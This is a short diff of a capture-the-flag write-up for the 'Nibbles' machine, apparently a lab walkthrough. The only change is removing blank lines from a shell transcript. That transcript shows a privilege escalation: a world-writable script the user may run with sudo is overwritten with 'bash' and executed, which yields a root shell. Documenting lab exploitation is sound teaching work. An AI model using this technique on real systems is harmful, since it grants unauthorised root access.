@@ -245,9 +245,7 @@ The file is world readable and writable, which means I can edit this script to d
 
 ```
 nibbler@Nibbles:/home/nibbler$ cp monitor.sh ~/
-
 nibbler@Nibbles:/home/nibbler$ echo bash > monitor.sh
-
 nibbler@Nibbles:/home/nibbler$ sudo /home/nibbler/personal/stuff/monitor.sh
 
 root@Nibbles:/home/nibbler/personal/stuff#
